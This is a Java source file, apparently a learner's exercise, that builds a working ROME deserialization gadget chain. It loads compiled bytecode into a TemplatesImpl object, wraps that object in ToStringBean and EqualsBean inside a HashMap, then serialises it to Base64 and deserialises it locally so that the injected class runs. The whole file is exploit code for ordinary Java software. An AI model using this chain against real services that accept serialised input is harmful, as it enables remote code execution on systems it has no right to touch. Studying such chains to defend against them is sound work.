package com.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;

public class EXP2 {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templatesimpl = new TemplatesImpl();
        SetFieldValue(templatesimpl,"_name","aaa");
        byte[] code= Files.readAllBytes(Paths.get("C:\\Users\\86151\\hexo-blog\\source\\_posts\\ysoserial\\ysoserial\\target\\classes\\Test.class"));
        byte[][] codes=new byte[][]{code};
        SetFieldValue(templatesimpl,"_bytecodes",codes);
        SetFieldValue(templatesimpl,"_tfactory",new TransformerFactoryImpl());
        SetFieldValue(templatesimpl,"_transletIndex",1);
        ToStringBean toStringBean = new ToStringBean(Templates.class,"1"); //要用Templates.class不能用TemplatesImpl.class,
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean);
        HashMap<Object,Object> hashMap = new HashMap<>();
        hashMap.put(equalsBean,"123");

        Field field = toStringBean.getClass().getDeclaredField("_obj");
        field.setAccessible(true);
        field.set(toStringBean,templatesimpl);
        String s=serialize(hashMap);
        deserialize(s);


    }
    public static void SetFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field declaredField = obj.getClass().getDeclaredField(fieldName);
        declaredField.setAccessible(true);
        declaredField.set(obj, value);
    }
    public static String serialize(Object obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }
    public static Object deserialize(String data) throws Exception {
        ByteArrayInputStream bais = new ByteArrayInputStream(Base64.getDecoder().decode(data));
        ObjectInputStream ois = new ObjectInputStream(bais);
        return ois.readObject();
    }

}
